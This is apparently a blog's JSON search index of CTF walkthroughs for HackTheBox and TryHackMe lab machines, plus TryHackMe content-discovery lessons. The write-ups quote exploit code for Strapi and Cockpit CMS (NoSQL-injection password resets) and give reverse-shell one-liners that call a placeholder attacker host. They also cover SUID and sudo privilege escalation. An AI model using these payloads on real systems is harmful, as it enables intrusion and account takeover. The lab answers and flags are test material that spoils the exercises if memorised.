[ { "title": "Horizontall", "url": "/posts/Horizontall/", "categories": "CTF, hackthebox", "tags": "dns", "date": "2021-12-28 11:11:11 +0530", "snippet": " Machine Name Date Level Type Horizontall 2021-12-28 Easy ctf ReconnaissanceAs always start with the Nmap.Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-12 13:59 ESTNmap scan report for horizontall.htb (10.10.11.105)Host is up (0.31s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)| 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)|_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: horizontallService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.19 secondshere we get the HTTP server and ssh service.HTTPLet’s Enumerate the HTTP first.When we browse the IP address into a browser it redirects us to http://horizontall.htb. Add it to /etc/hosts file.index.html serves a static image.Review source code but nothing interested found.Lets try to fuzz for subdomains.ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://horizontall.htb -H &quot;Host:FUZZ.horizontall.htb&quot; -fc 301we can find one subdomain : api-prod /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://horizontall.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt :: Header : Host: FUZZ.horizontall.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 301________________________________________________api-prod [Status: 200, Size: 413, Words: 76, Lines: 20]when we go-to http://api-prod.horizontall.htb webpage only display Welcome text.Let’s do directory fuzzing on subdomain.ffuf -u http://api-prod.horizontall.htb/FUZZ -w /usr/share/wordlists/dirb/common.txtwe get/admin/index.html/reviews/robots.txt/usersrobots.txt is empty.# To prevent search engines from seeing the site altogether, uncomment the next two lines:# User-Agent: *# Disallow: //admin looks interesting. Lets check it out.on the /admin page we get strapi login page.strapi is node.js , opensource api.A quick search of searchsploit and we got rce.Let analyse the exploit first.if __name__ == (&quot;__main__&quot;): url = sys.argv[1] if url.endswith(&quot;/&quot;): url = url[:-1] check_version() password_reset() terminal = Terminal() terminal.cmdloop()First It will check if user provide any input (in this case a url) and if url is ended with / it will strip it.next it will run the check_version() function.def check_version(): global url print(&quot;[+] Checking Strapi CMS Version running&quot;) version = requests.get(f&quot;{url}/admin/init&quot;).text version = json.loads(version) version = version[&quot;data&quot;][&quot;strapiVersion&quot;] if version == &quot;3.0.0-beta.17.4&quot;: print(&quot;[+] Seems like the exploit will work!!!\\n[+] Executing exploit\\n\\n&quot;) else: print(&quot;[-] Version mismatch trying the exploit anyway&quot;)check version function try to find out version of strapi.this function send the request to http://api-prod.horizontall.htb/admin/init. lets fetch strapi version manually.curl http://api-prod.horizontall.htb/admin/initAs we can see we got version 3.0.0-beta.17.4 which is vulnerable to Unauthenticated Remote Code Execution.Next exploit run the function password_reset()global url, jwt session = requests.session() params = {&quot;code&quot; : {&quot;$gt&quot;:0}, &quot;password&quot; : &quot;SuperStrongPassword1&quot;, &quot;passwordConfirmation&quot; : &quot;SuperStrongPassword1&quot; } output = session.post(f&quot;{url}/admin/auth/reset-password&quot;, json = params).text response = json.loads(output) jwt = response[&quot;jwt&quot;] username = response[&quot;user&quot;][&quot;username&quot;] email = response[&quot;user&quot;][&quot;email&quot;] if &quot;jwt&quot; not in output: print(&quot;[-] Password reset unsuccessfull\\n[-] Exiting now\\n\\n&quot;) sys.exit(1) else: print(f&quot;[+] Password reset was successfully\\n[+] Your email is: {email}\\n[+] Your new credentials are: {username}:SuperStrongPassword1\\n[+] Your authenticated JSON Web Token: {jwt}\\n\\n&quot;)This function is used to reset password for user.It is send request to the http://api-prod.horizontall.htb/admin/auth/reset-password with the params data. and save output in output variable.after successful execute of exploit it will run the Terminal() function. which is just serve us blind shell.Gaining AccessNow we understand how exploit works lets try it out.We get reverse shell usingmkfifo /tmp/lol;nc attacker_ip 1234 0&amp;lt;/tmp/lol | /bin/sh -i 2&amp;gt;&amp;amp;1 | tee /tmp/lolAdd our ssh public key in /opt/strapi/.ssh/authorized_keysand ssh into box.Privilege Escalationstrapi to root.run the linpeas.sh and we found out port 1337 and 8000 are listen locally.Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN tcp 0 0 localhost:1337 0.0.0.0:* LISTEN tcp 0 0 localhost:8000 0.0.0.0:* LISTEN tcp 0 0 localhost:mysql 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:http 0.0.0.0:* LISTEN We can forward the port and analyse it from our machine.` ssh strapi@$ip -L 8000:127.0.0.1:8000 `browse the http://127.0.0.1:8000/. We got the default laravel page.Here we can also see the version : Laravel v8 (PHP v7.4.18).Lets quick search for exploit and we got Laravel 8.4.2 debug mode - Remote code execution . This exploit target the improper input validation and attacker can get rce using this exploit.Resources" }, { "title": "Anonymous", "url": "/posts/Anonymous/", "categories": "CTF, tryhackme", "tags": "ftp, suid", "date": "2021-12-01 11:11:11 +0530", "snippet": "Not the hacking group Machine Name Date Level Type Anonymous 2 Dec 2021 Medium ctf ReconnaissanceStart the recon with Nmap.Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 09:36 EDTNmap scan report for 10.10.187.181Host is up (0.16s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts [NSE: writeable]| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.133.3| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)| 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)|_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 0s, deviation: 1s, median: 0s|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: anonymous| NetBIOS computer name: ANONYMOUS\\x00| Domain name: \\x00| FQDN: anonymous|_ System time: 2021-10-07T13:36:24+00:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-10-07T13:36:24|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .According to Nmap output we got SSH, FTP and SMB services to test.smbenumerate the pics share.smbclient -L //$ip/Enter WORKGROUP\\kali&#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers pics Disk My SMB Share Directory for Pics IPC$ IPC IPC Service (anonymous server (Samba, Ubuntu))SMB1 disabled -- no workgroup availableLog in to pics share.smbclient //$ip/picsEnter WORKGROUP\\kali&#39;s password: Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; ls . D 0 Sun May 17 07:11:34 2020 .. D 0 Wed May 13 21:59:10 2020 corgo2.jpg N 42663 Mon May 11 20:43:42 2020 puppos.jpeg N 265188 Mon May 11 20:43:42 2020 20508240 blocks of size 1024. 13306816 blocks availableDownloaded those files and check for stego but it’s just a rabbit hole.ftpNmap show’s that we can log in as anonymous on the FTP and the FTP server is also writable. Let’s log in and check the server.there is scripts folder in the server with some files.ftp&amp;gt; ls -la200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxrwxrwx 2 111 113 4096 Jun 04 2020 .drwxr-xr-x 3 65534 65534 4096 May 13 2020 ..-rwxr-xrwx 1 1000 1000 314 Jun 04 2020 clean.sh-rw-rw-r-- 1 1000 1000 946 Dec 02 14:44 removed_files.log-rw-r--r-- 1 1000 1000 68 May 12 2020 to_do.txt226 Directory send OK.We can assume that a cronjob is set for clean.sh. let’s download all the files and find out what it doing.clean.sh#!/bin/bashtmp_files=0echo $tmp_filesif [ $tmp_files=0 ]then echo &quot;Running cleanup script: nothing to delete&quot; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.logelse for LINE in $tmp_files; do rm -rf /tmp/$LINE &amp;amp;&amp;amp; echo &quot;$(date) | Removed file /tmp/$LINE&quot; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log;donefiThis script is checking files in /tmp directory and if it found any files then delete it and add the file name to file removed_files.log with the date.FTP server is writable so we can mount it and add our reverse shell in clean.sh.Gaining AccessLet’s Mount FTP server using curlftpfs.curlftpfs anonymous@$ip mount/using vim added bash reverse shellcode.bash -i &amp;gt;&amp;amp; /dev/tcp/ATTACKING-IP/80 0&amp;gt;&amp;amp;1After some time we get a shell as namelessone.Privilege EscalationNamelessone to rootAfter some enumeration, I found out that the SUID bit is set to /usr/bin/env./usr/bin/env /bin/sh -pGot root.namelessone@anonymous:~$ /usr/bin/env /bin/sh -p/usr/bin/env /bin/sh -pwhoamirootResources**blank**" }, { "title": "Cmspit", "url": "/posts/Cmspit/", "categories": "CTF, tryhackme", "tags": "cms, mongodb, nosql injection, CVE-2020-35846, CVE-2021-22204, exiftool", "date": "2021-11-29 11:11:11 +0530", "snippet": "This is a machine that allows you to practice web app hacking and privilege escalation using recent vulnerabilities. Machine Name Date Level Type Cmspit 2021 30 Nov 2021 Medium ctf ReconnaissanceAs always start with Nmap.Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 11:09 ESTNmap scan report for 10.10.29.223Host is up (0.32s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)| 256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)|_ 256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)80/tcp open ssl/http Apache/2.4.18 (Ubuntu)|_http-server-header: Apache/2.4.18 (Ubuntu)| http-title: Authenticate Please!|_Requested resource was /auth/login?to=/|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 68.16 secondsWe got two services to attack. ssh and HTTP. generally, HTTP is more prone to be vulnerable, lets start with HTTP :httpWhen we go-to IP address, we got a login page. On the login page, we find out that it uses cockpit cms. the cockpit is an open-source content management system.and looking at page source code found out the cms version: 0.11.1A quick searchsploit search and we found an exploit.This exploit enumerates the username and resets the password for the user using NoSQL Injection.Gaining AccessLet’s understand the exploit before running it.exploit code target the /auth/check . after checking the code we know that there is an issue with user parameter. it does not check if the user provides the genuine username or other objects. here if feed the other objects it will be parsed by MongoDB shell and run as a query./auth/check code.Username Enumerationdef enumerate_users(url): print(&quot;[-] Attempting Username Enumeration (CVE-2020-35846) : \\n&quot;) url = url + &quot;/auth/requestreset&quot; headers = { &quot;Content-Type&quot;: &quot;application/json&quot; } data= {&quot;user&quot;:{&quot;$func&quot;:&quot;var_dump&quot;}} req = requests.post(url, data=json.dumps(data), headers=headers) pattern=re.compile(r&#39;string\\(\\d{1,2}\\)\\s*&quot;([\\w-]+)&quot;&#39;, re.I) matches = pattern.findall(req.content.decode(&#39;utf-8&#39;)) if matches: print (&quot;[+] Users Found : &quot; + str(matches)) return matches else: print(&quot;No users found&quot;)Exploit code send the request to /auth/requestreset (/auth/check is also vulnerable ) and send data as {&quot;user&quot;:{&quot;$func&quot;:&quot;var_dump&quot;}} to retrive the all users.var_dump: var_dump is a PHP function that dumps info about one or more variables.We got four users. admin sdarkStar7471 skidy ekopartyget token for reset password/auth/resetpassword is responsible for a user password reset.Like user parameter, token parameter also does not filter anything. so we can use the previous method (var_dump) to extract the existing tokens.def reset_tokens(url): print(&quot;[+] Finding Password reset tokens&quot;) url = url + &quot;/auth/resetpassword&quot; headers = { &quot;Content-Type&quot;: &quot;application/json&quot; } data= {&quot;token&quot;:{&quot;$func&quot;:&quot;var_dump&quot;}} req = requests.post(url, data=json.dumps(data), headers=headers) pattern=re.compile(r&#39;string\\(\\d{1,2}\\)\\s*&quot;([\\w-]+)&quot;&#39;, re.I) matches = pattern.findall(req.content.decode(&#39;utf-8&#39;)) if matches: print (&quot;\\t Tokens Found : &quot; + str(matches)) return matches else: print(&quot;No tokens found, &quot;)Reset passworddef password_reset(url, token, user): print(&quot;[-] Attempting to reset %s&#39;s password:&quot; %user) characters = string.ascii_letters + string.digits + string.punctuation password = &#39;&#39;.join(random.choice(characters) for i in range(10)) url = url + &quot;/auth/resetpassword&quot; headers = { &quot;Content-Type&quot;: &quot;application/json&quot; } data= {&quot;token&quot;:token, &quot;password&quot;:password} req = requests.post(url, data=json.dumps(data), headers=headers) if &quot;success&quot; in req.content.decode(&#39;utf-8&#39;): print(&quot;[+] Password Updated Succesfully!&quot;) print(&quot;[+] The New credentials for %s is: \\n \\t Username : %s \\n \\t Password : %s&quot; % (user, user, password))It will send the token and new password and the application change the account password by using the /auth/resetpassword method.Now we have the new password and username. we can log in to the box.go to http://10.10.3.161/finder and upload a PHP shell.Got shell as www-dataPrivilege Escalationwww-data to stux.after some enumeration we found a user on box stux and in his home directory found a file called .dbshell.this file has a password for stux.stux: p****************3Log in as stux using the above password.stux@ubuntu:~$ whoamiwhoamistuxstux to root.stux can run exiftool as root.from here we can get only root.txt and stop or we can get the actual root shell. we go with the second option because why not.So after some more enumeration, I found that exiftool is vulnerable to CVE-2021-22204.root@ubuntu:~# whoamirootResourcesFrom 0 to RCE: Cockpit CMSA case study on CVE-2021-22204 – Exiftool RCE" }, { "title": "Cybercrafted", "url": "/posts/Cybercrafted/", "categories": "CTF, tryhackme", "tags": "dns, sqli, hash, sudo, minecraft", "date": "2021-11-24 11:11:11 +0530", "snippet": " Machine Name Date Level Type Cybercrafted 2021-11-24 Medium ctf Pwn this pay-to-win Minecraft server!ReconnaissanceAs always start with the Nmap.Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 23:54 ESTNmap scan report for cybercrafted.thm (10.10.61.207)Host is up (0.17s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)| 256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)|_ 256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Cybercrafted25565/tcp open minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r ck00r, Users: 0/1)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.57 secondshere we get the HTTP server and ssh service.HTTPLet’s Enumerate the HTTP first.When we browse the IP address into a browser it redirects us to http://cybercrafted.thm/. Add it to /etc/hosts file.index.html serves a static image.Review source code we get an HTML comment.&amp;lt;!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! --&amp;gt;We need to find a subdomain for the machine. Lets bruteforce for subdomains.` ffuf -w /usr/share/wordlist/dirb/common.md -u http://cybercrafted.thm/ -H “Host: FUZZ.cybercrafted.thm”`by brute-forcing, we get three subdomains. www store adminadd subdomain in /etc/hosts file./admin looks interesting.Try some SQL injection bypass techniques but failed./store is a Forbidden resource. but when we do directory fuzzing on store.cybercrafted.thm we get /search.phpsearch.php searches items from the database so it might be vulnerable to SQL injection. Let’s test using sqlmap.Capture the search.php request in burp and save it to sqltest.txtPOST /search.php HTTP/1.1Host: store.cybercrafted.thmUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 22Origin: http://store.cybercrafted.thmConnection: closeReferer: http://store.cybercrafted.thm/search.phpUpgrade-Insecure-Requests: 1search=testing&amp;amp;submit=sqlmap -r sqltest --batch --dbs/search.php is vulnerable to SQL injection.available databases [5]: [*] information_schema [*] mysql [*]performance_schema [*] sys [*] webapp Enumerate the database found user and hash.xXUltimateCreeperXx: 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01after cracking the hash got password: di*************9user xXUltimateCreeperXx:di*************9 Login into admin.cybercrafted.thmAfter login, we got /panel.php on which we can run system commands.From here we can get a shell by various ways.Gaining AccessMostly I prefer ssh shell because it’s the stable one.from panel.php get xXUltimateCreeperXx user’s private ssh key.A private key is encrypted. Let’s crack it using ssh2john and johnssh2john id_rsa &amp;gt; hashjohn hash --wordlist=/usr/share/wordlist/rockyou.txtjohn crack the password successfully: c*********6Login as xxultimatecreeperxxPrivilege EscalationEscalate from xxultimatecreeperxx to cybercraftedAfter downloading linpeas.sh to the target machine and enumerating it for some time I find Minecraft server on the machine.this Minecraft server has a plugin called loginsystem which has a log file called log.txt./opt/mincraft/cybercrafted/plugins/LoginSystem/log.txtFrom this file, we get the password for cybercrafted user.cybercrafted:J*****************kLog in as cybercrafted.Now we have a password for cybercrafted.Escalate from cybercrafted to rootDid some enumeration on the box and found out that cybercrafted can run /usr/bin/screen as root.Matching Defaults entries for cybercrafted on cybercrafted: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser cybercrafted may run the following commands on cybercrafted: (root) /usr/bin/screen -r cybercraftedscreen is used to start a screen session or open any number of the window inside a session./usr/bin/screen -r cybercrafted here -r used to resume the screen session of user cybercrafted.After some research, I found out that we can create a new window with a shell using screen.sudo -u /usr/bin/screen -r cybercraftedit attaches the screen of cybercrafted .then use shortcut ctrl+a+c and we get a root shell.ctrl+a+c is used to create a new window with shell. and this program is running as root we get root window shell.ResourcesHow To Use Linux Screen" }, { "title": "Content Discovery", "url": "/posts/Content-Discovery/", "categories": "CTF, tryhackme", "tags": "osint, web", "date": "2021-11-22 11:11:11 +0530", "snippet": " Machine Name Date Level Type Content Discovery 23 nov 2021 Easy walkthroughs earn the various ways of discovering hidden or private content on a webserver that could lead to new vulnerabilities.Task 1 What is contain discoveryFirstly, we should ask, in the context of web application security, what is content? Content can be many things, a file, video, picture, backup, a website feature. When we talk about content discovery, we’re not talking about the obvious things we can see on a website; it’s the things that aren’t immediately presented to us and that weren’t always intended for public access.This content could be, for example, pages or portals intended for staff usage, older versions of the website, backup files, configuration files, administration panels, etc.There are three main ways of discovering content on a website which we’ll cover. Manually, Automated and OSINT (Open-Source Intelligence).Start the machine and then move on to the next task.Answer the questions belowWhat is the Content Discovery method that begins with M? manuallyWhat is the Content Discovery method that begins with A? automatedWhat is the Content Discovery method that begins with O? osintTask 2 Manual Discovery - Robots.txtThere are multiple places we can manually check on a website to start discovering more content.Robots.txtThe robots.txt file is a document that tells search engines which pages they are and aren’t allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren’t displayed in search engine results. These pages may be areas such as administration portals or files meant for the website’s customers. This file gives us a great list of locations on the website that the owners don’t want us to discover as penetration testers.Take a look at the robots.txt file on the Acme IT Support website to see if they have anything they don’t want to list: http://10.10.109.240/robots.txtAnswer the questions belowWhat is the directory in the robots.txt that isn’t allowed to be viewed by web crawlers? /staff-portalTask 3 Manual Discovery - FaviconFaviconThe favicon is a small icon displayed in the browser’s address bar or tab used for branding a website.Sometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover, and if the website developer doesn’t replace this with a custom one, this can give us a clue on what framework is in use. OWASP host a database of common framework icons that you can use to check against the targets favicon https://wiki.owasp.org/index.php/OWASP_favicon_database. Once we know the framework stack, we can use external resources to discover more about it (see next section).Practical Exercise:Open the website https://static-labs.tryhackme.cloud/sites/favicon/ here you’ll see a basic website with a note saying “Website coming soon…”, if you look at your tabs you’ll notice an icon that confirms this site is using a favicon.Viewing the page source you’ll see line six contains a link to the images/favicon.ico file.If you run the following command it will download the favicon and get its md5 hash value which you can then lookup on thehttps://wiki.owasp.org/index.php/OWASP_favicon_database. user@machine$ curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sumAnswer the questions belowWhat framework did the favicon belong to? cgiircTask 4 Manual Discovery - Sitemap.xmlSitemap.xmlUnlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.Take a look at the sitemap.xml file on the Acme IT Support website to see if there’s any new content we haven’t yet discovered: http://10.10.109.240/sitemap.xmlAnswer the questions belowWhat is the path of the secret area that can be found in the sitemap.xml file? /s3cr3t-areaTask 5 Manual Discovery - HTTP HeadersHTTP HeadersWhen we make requests to the web server, the server returns various HTTP headers. These headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use. In the below example, we can see the webserver is NGINX version 1.18.0 and runs PHP version 7.4.3. Using this information, we could find vulnerable versions of software being used. Try running the below curl command against the web server, where the -v switch enables verbose mode, which will output the headers (there might be something interesting!).curl http://ip -v THM{HEADER_FLAG}Task 6 Manual Discovery - Framework StackFramework StackOnce you’ve established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework’s website. From there, we can learn more about the software and other information, possibly leading to more content we can discover.Looking at the page source of our Acme IT Support website (http://10.10.109.240), you’ll see a comment at the end of every page with a page load time and also a link to the framework’s website, which is https://static-labs.tryhackme.cloud/sites/thm-web-framework. Let’s take a look at that website. Viewing the documentation page gives us the path of the framework’s administration portal, which gives us a flag if viewed on the Acme IT Support website.Answer the questions belowWhat is the flag from the framework’s administration portal? THM{CHANGE_DEFAULT_CREDENTIALS}Task 7 OSINT - Google Hacking / DorkingThere are also external resources available that can help in discovering information about your target website; these resources are often referred to as OSINT or (Open-Source Intelligence) as they’re freely available tools that collect information:Google Hacking / DorkingGoogle hacking / Dorking utilizes Google’s advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out results from a certain domain name using the site: filter, for example (site:tryhackme.com) you can then match this up with certain search terms, say, for example, the word admin (site:tryhackme.com admin) this then would only return results from the tryhackme.com website which contain the word admin in its content. You can combine multiple filters as well.More information about google hacking can be found here: https://en.wikipedia.org/wiki/Google_hackingAnswer the questions below** What Google dork operator can be used to only show results from a particular site?** site:Task 8 OSINT - WappalyzerWappalyzerWappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.Answer the questions belowWhat online tool can be used to identify what technologies a website is running? wappalyzerTask 9 OSINT - Wayback MachineWayback MachineThe Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.Answer the questions belowWhat is the website address for the Wayback Machine? https://archive.org/web/Task 10 OSINT - GitHubGitHubTo understand GitHub, you first need to understand Git. Git is a version control system that tracks changes to files in a project. Working in a team is easier because you can see what each team member is editing and what changes they made to files. When users have finished making their changes, they commit them with a message and then push them back to a central location (repository) for the other users to then pull those changes to their local machines. GitHub is a hosted version of Git on the internet. Repositories can either be set to public or private and have various access controls. You can use GitHub’s search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn’t yet found.Answer the questions belowWhat is Git? version control systemTask 11 OSINT - S3 BucketsS3 BucketsS3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn’t be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website’s page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.Answer the questions belowWhat URL format do Amazon S3 buckets end in? .s3.amazonaws.comTask 12 Automated DiscoveryWhat is Automated Discovery?Automated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn’t previously know existed. This process is made possible by using a resource called wordlists.What are wordlists?Wordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the most frequently used passwords, whereas we’re looking for content in our case, so we’d require a list containing the most commonly used directory and file names. An excellent resource for wordlists that is preinstalled on the THM AttackBox is https://github.com/danielmiessler/SecLists which Daniel Miessler curates.Automation ToolsAlthough there are many different content discovery tools available, all with their features and flaws, we’re going to cover three which are preinstalled on our attack box, ffuf, dirb and gobuster.Open the THM AttackBox using the blue Start AttackBox button and then try the below three commands on our Acme IT Support website and see what results you get.Using ffuf:ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.109.240/FUZZUsing dirb:dirb http://10.10.109.240/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txtUsing Gobuster:gobuster dir --url http://10.10.109.240/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txtUsing the results from the commands above, please answer the below questions:Answer the questions belowWhat is the name of the directory beginning “/mo….” that was discovered? /monthlyWhat is the name of the log file that was discovered? /development.log" }, { "title": "Learning Cyber Security", "url": "/posts/Learning-Cyber-Security/", "categories": "CTF, tryhackme", "tags": "", "date": "2021-09-18 11:11:11 +0530", "snippet": " Machine Name Date Level Type Learning Cyber Security 19 sep 2021 Easy walkthroughs Get a short introduction to a few of the security topics you’ll be learning about, like Web application security and Network security.Web application securityWhy understanding how the web works is importantTo attack web applications, you need to understand how they work. Hacking websites isn’t some magical process but does come down to knowing how a part of a website functions and being able to identify weaknesses to take advantage of. Once you have a good understanding of the fundamentals, you’ll learn about the techniques and tools used in hacking sites.If something is vulnerable, it means there is the possibility of it being attacked or harmed. If an application or system has a vulnerability, there is something that can be attacked or taken advantage of (a weakness).Click the green “View Site” button above and learn how to hack BookFace, TryHackMe’s vulnerable social media site. No answer neededWhat is the username of the BookFace account you will be taking over? Ben.SpringHack the BookFace account to reveal this task’s answer! THM{BRUTEFORCING}Network SecurityWhy networking is importantNetworking is really important to understand in cyber security. From scanning and identifying who and what is on a network, to reviewing network logs to monitor and track what users have been up to will require you to have an understanding of how networks work.TryHackMe’s Complete Beginner learning path will walk you through the networking concepts and give you enough knowledge to get started in your cyber security journey.Click the green “View Site” button above and see how Target was hacked on the right hand side. No answer needed.How much did the data breach cost Target? $300 millionLearning RoadmapAbove is a learning path roadmap. The Pre Security path will teach you the technical knowledge you need to get started in cyber security. Once you understand the basics, enroll in either the Offensive Pentesting (ethically hacking systems) or the Cyber Defense (investigating attacks and defending systems) path.The skills you acquire from the learning paths will prepare you for a career as an ethical hacker, penetration tester or cyber security analyst.Read the above No answer needed.NotesNAResourcesNA" }, { "title": "Web Recon", "url": "/posts/Web-Methodology/", "categories": "bug, methodology", "tags": "web", "date": "2021-09-13 11:11:11 +0530", "snippet": "My Simple Reconnaissance Methodology for Bug Hunting.ReconTarget.comDirectory fuzzing Direcotory fuzzing for files and directory with know extentions. :extention : db,php,txt based on tech used.ffuf -u $target -w /usr/share/wordlist/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -e db php txt -of md -o dirscan/big_with_db_php_txt.mdSubdomainshttps://chaos.projectdiscovery.io/#/ –&amp;gt; keep track of new subdomains and targets.Fuzzingffuf -w 